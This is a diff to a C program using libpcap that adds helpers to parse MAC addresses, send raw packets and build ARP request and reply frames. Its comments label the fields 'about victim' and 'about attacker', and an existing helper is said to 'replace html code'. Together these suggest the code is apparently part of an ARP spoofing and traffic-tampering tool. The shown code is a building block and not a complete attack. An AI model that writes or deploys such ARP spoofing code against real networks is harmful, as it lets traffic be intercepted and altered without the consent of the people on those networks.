@@ -13,6 +13,9 @@
 #include <arpa/inet.h> //htons.ntohs
 #include <pcap.h> //libpacp
 #include <unistd.h> //delay
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
 
 //ethernet type
 #define EPT_IPv4    0x0800 //type: IPv4
@@ -141,6 +144,23 @@ void loading(void) {
     printf(" Done!\n\n");
 }
 
+//htoi
+int htoi(char h) {
+    if ('0' <= h && h <= '9')
+        return h - '0';
+    else
+        return h - 'a' + 10;
+}
+//get mac address
+void get_mac(u_char *mac, char *str) {
+    mac[0] = htoi(str[0]) * 16 + htoi(str[1]);
+    mac[1] = htoi(str[3]) * 16 + htoi(str[4]);
+    mac[2] = htoi(str[6]) * 16 + htoi(str[7]);
+    mac[3] = htoi(str[9]) * 16 + htoi(str[10]);
+    mac[4] = htoi(str[12]) * 16 + htoi(str[13]);
+    mac[5] = htoi(str[15]) * 16 + htoi(str[16]);
+}
+
 //get device
 char* getdev(char *dev, char *errbuf) {
     printf("Finding device\n");
@@ -150,10 +170,17 @@ char* getdev(char *dev, char *errbuf) {
         exit(1);
     }
     loading();
-    printf("The net device is %s\n", dev);
+    printf("The net device is %s\n\n", dev);
     return dev;
 }
 
+// send packet
+void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
+    if (pcap_sendpacket(handle, packet, packetsize) != 0)
+        printf("Packet send failed!\n");
+}
+
+//replace html code
 int str_replace(char* str,char* str_src, char* str_des){
     char *ptr = NULL;
     char buff[65536];
@@ -173,4 +200,41 @@ int str_replace(char* str,char* str_src, char* str_des){
     strcat(buff,buff2);
     strcpy(str,buff);
     return 0;
+}
+
+// create arp packet
+void ARP_packet_build(u_char *ARPpacket, int packetsize,
+u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
+    ethernet_header ehead;
+    arp_header ahead;
+    memset(ARPpacket, 0, packetsize);
+    
+    /* about victim */
+    if (op == 1) { //ARP request
+        memset(ehead.DST_mac, 0xff, 6);
+        memset(ahead.dest_mac, 0x00, 6);
+        memset(ahead.dest_ip, 0, 4);
+    }
+    else { //ARP reply
+        memcpy(ehead.DST_mac, dst_mac, 6);
+        memcpy(ahead.dest_mac, dst_mac, 6);
+        memcpy(ahead.dest_ip, dst_ip, 4);
+    }
+    
+    /* about attacker */
+    memcpy(ehead.SRC_mac, src_mac, 6);
+    memcpy(ahead.src_mac, src_mac, 6);
+    memcpy(ahead.src_ip, src_ip, 4);
+    
+    /* others */
+    ehead.eth_type = htons((u_short)EPT_ARP);
+    ahead.hardware_type = htons((u_short)1);
+    ahead.protocol_type = htons((u_short)EPT_IPv4);
+    ahead.hardware_len = (u_char)6;
+    ahead.protocol_len = (u_char)4;
+    ahead.arp_option = htons((u_short)op);
+    
+    /* get together */
+    memcpy(ARPpacket, &ehead, sizeof(ehead));
+    memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
 }
